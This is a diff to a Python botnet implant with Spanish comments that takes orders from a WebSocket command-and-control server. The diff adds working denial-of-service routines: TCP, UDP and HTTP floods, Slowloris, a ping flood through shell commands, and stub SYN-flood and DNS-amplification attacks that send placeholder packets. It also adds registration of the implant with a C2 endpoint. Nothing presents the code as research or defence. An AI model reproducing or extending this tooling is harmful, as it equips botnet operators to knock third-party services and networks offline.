@@ -5,9 +5,14 @@ import signal
 import sys
 import os
 import base64
+import socket
+import random
+import threading
+import time
 from websockets import connect
 from websockets.exceptions import ConnectionClosedError
 from typing import List, Dict, Tuple, Optional
+import requests
 
 class Impl:
     def __init__(self, c2_ws_url: str, group: str = "grupo1"):
@@ -17,6 +22,8 @@ class Impl:
         self.upload_buffer = []
         self.upload_destination = None
         self.running = True
+        self.active_attack = False
+        self.attack_thread = None
         
         # Configurar manejador de señales
         signal.signal(signal.SIGINT, self._def_handler)
@@ -203,8 +210,18 @@ class Impl:
         target = data['attack']['target']
         duration = data['attack'].get('duration', 60)
         
-        # Implementar lógica de ataque aquí
-        # Por ejemplo: DDoS, TCP flood, etc.
+        # Detener cualquier ataque previo
+        if self.active_attack:
+            await self._stop_attack(ws)
+        
+        # Iniciar nuevo ataque
+        self.active_attack = True
+        self.attack_thread = threading.Thread(
+            target=self._execute_attack,
+            args=(str(attack_type), str(target), int(duration), ws),
+            daemon=True
+        )
+        self.attack_thread.start()
         
         await ws.send(json.dumps({
             "status": "attack_started",
@@ -213,11 +230,202 @@ class Impl:
             "duration": duration
         }))
     
+    def _execute_attack(self, attack_type: str, target: str, duration: int, ws) -> None:
+
+        """Ejecuta el ataque en un hilo separado"""
+        end_time = time.time() + duration
+        
+        try:
+            if attack_type == "tcp_flood":
+                self._tcp_flood_attack(target, end_time)
+            elif attack_type == "udp_flood":
+                self._udp_flood_attack(target, end_time)
+            elif attack_type == "http_flood":
+                self._http_flood_attack(target, end_time)
+            elif attack_type == "slowloris":
+                self._slowloris_attack(target, end_time)
+            elif attack_type == "syn_flood":
+                self._syn_flood_attack(target, end_time)
+            elif attack_type == "icmp_flood":
+                self._icmp_flood_attack(target, end_time)
+            elif attack_type == "dns_amplification":
+                self._dns_amplification_attack(target, end_time)
+            else:
+                print(f"[!] Tipo de ataque no reconocido: {attack_type}")
+        except Exception as e:
+            print(f"[!] Error en el ataque: {e}")
+        finally:
+            self.active_attack = False
+    
+    def _tcp_flood_attack(self, target: str, end_time: float) -> None:
+        """Ataque de inundación TCP"""
+        target_ip, target_port = target.split(":")
+        target_port = int(target_port)
+        
+        while time.time() < end_time and self.active_attack:
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(1)
+                s.connect((target_ip, target_port))
+                s.send(random._urandom(1024))
+                s.close()
+            except:
+                pass
+    
+    def _udp_flood_attack(self, target: str, end_time: float) -> None:
+        """Ataque de inundación UDP"""
+        target_ip, target_port = target.split(":")
+        target_port = int(target_port)
+        
+        while time.time() < end_time and self.active_attack:
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                s.sendto(random._urandom(1024), (target_ip, target_port))
+                s.close()
+            except:
+                pass
+    
+    def _http_flood_attack(self, target: str, end_time: float) -> None:
+        print(target)
+        """Ataque de inundación HTTP"""
+        import urllib.request
+        # 1. Verificar formato del target
+        if not target.startswith(('http://', 'https://')):
+            target = 'http://' + target  # Asumir HTTP si no se especifica
+        
+        # 2. Configurar timeout para no bloquear el ataque
+        socket.setdefaulttimeout(5)  # 5 segundos
+        
+        # 3. Headers básicos para evitar bloqueos
+        headers = {
+            'User-Agent': 'Mozilla/5.0',
+            'Accept': '*/*',
+            'Connection': 'close'  # No mantener conexiones vivas
+        }
+        
+        # 4. Preparar la solicitud
+        request = urllib.request.Request(
+            url=target,
+            headers=headers,
+            method='GET'
+        )
+        
+        print(f"[*] Iniciando HTTP Flood a {target}")
+        
+        # 5. Bucle principal de ataque
+        while time.time() < end_time and self.active_attack:
+            try:
+                # 6. Enviar petición y leer algo de respuesta
+                with urllib.request.urlopen(request) as response:
+                    response.read(64)  # Leer mínimo para consumir recursos
+                
+                # 7. Pequeña pausa para evitar saturación local
+                time.sleep(0.01)
+                
+            except urllib.error.URLError as e:
+                print(f"[!] Error de URL: {e.reason}")
+                break
+            except Exception as e:
+                print(f"[!] Error: {str(e)}")
+                time.sleep(1)  # Esperar antes de reintentar
+        
+        print("[*] Ataque HTTP Flood finalizado")
+    
+    def _slowloris_attack(self, target: str, end_time: float) -> None:
+        """Ataque Slowloris (mantiene conexiones HTTP abiertas)"""
+        target_ip, target_port = target.split(":")
+        target_port = int(target_port)
+        sockets = []
+        
+        try:
+            while time.time() < end_time and self.active_attack:
+                try:
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.connect((target_ip, target_port))
+                    s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
+                    s.send("User-Agent: Mozilla/5.0\r\n".encode())
+                    s.send("Accept-language: en-US,en,q=0.5\r\n".encode())
+                    sockets.append(s)
+                except:
+                    self._close_sockets(sockets)
+                    sockets = []
+                
+                # Mantener conexiones vivas
+                for s in sockets:
+                    try:
+                        s.send("X-a: b\r\n".encode())
+                    except:
+                        sockets.remove(s)
+                
+                time.sleep(15)
+        finally:
+            self._close_sockets(sockets)
+    
+    def _syn_flood_attack(self, target: str, end_time: float) -> None:
+        """Ataque SYN flood"""
+        target_ip, target_port = target.split(":")
+        target_port = int(target_port)
+        
+        while time.time() < end_time and self.active_attack:
+            try:
+                # Crear socket raw requiere permisos de administrador
+                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
+                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+                
+                # Paquete SYN simplificado (en realidad necesitarías construir los headers correctamente)
+                packet = b'\x00' * 64  # Placeholder
+                s.sendto(packet, (target_ip, target_port))
+                s.close()
+            except:
+                pass
+    
+    def _icmp_flood_attack(self, target: str, end_time: float) -> None:
+        """Ataque ICMP (Ping) flood"""
+        import os
+        
+        while time.time() < end_time and self.active_attack:
+            try:
+                if os.name == 'nt':
+                    os.system(f"ping -n 1 -l 65500 {target} > nul")
+                else:
+                    os.system(f"ping -c 1 -s 65500 {target} > /dev/null")
+            except:
+                pass
+    
+    def _dns_amplification_attack(self, target: str, end_time: float) -> None:
+        """Ataque de amplificación DNS"""
+        dns_servers = ["8.8.8.8", "8.8.4.4", "1.1.1.1"]  # Servidores DNS públicos
+        target_ip = target.split(":")[0]
+        
+        while time.time() < end_time and self.active_attack:
+            try:
+                for dns_server in dns_servers:
+                    # Consulta DNS simplificada (en realidad necesitarías construir una consulta válida)
+                    query = b'\x00' * 64  # Placeholder
+                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                    s.sendto(query, (dns_server, 53))
+                    s.close()
+            except:
+                pass
+    
+    def _close_sockets(self, sockets: list) -> None:
+        """Cierra todos los sockets en la lista"""
+        for s in sockets:
+            try:
+                s.close()
+            except:
+                pass
+    
     async def _stop_attack(self, ws) -> None:
         """Detiene cualquier ataque en curso"""
-        # Implementar lógica para detener ataque
+        self.active_attack = False
+        
+        if self.attack_thread and self.attack_thread.is_alive():
+            self.attack_thread.join(timeout=1)
+        
         await ws.send(json.dumps({
-            "status": "attack_stopped"
+            "status": "attack_stopped",
+            "message": "Ataque detenido correctamente"
         }))
     
     async def register(self) -> None:
@@ -230,10 +438,10 @@ class Impl:
             'operating_system': self._get_operating_system(),
             'impl_id': self.impl_id
         }
-        
-        # Aquí podrías implementar el registro HTTP o WebSocket
+ 
         print(f"[+] Implante registrado: {model}")
-    
+        req = requests.post(f"http://localhost:4000/api/impl/new/{model['impl_id']}", data=model)
+
     @property
     def impl_id(self) -> str:
         """Obtiene un ID único para el implante"""
@@ -270,6 +478,7 @@ class Impl:
         """Manejador de señales para salida limpia"""
         print("\n\n[!] Saliendo..\n")
         self.running = False
+        self.active_attack = False
         sys.exit(1)
 
 if __name__ == "__main__":
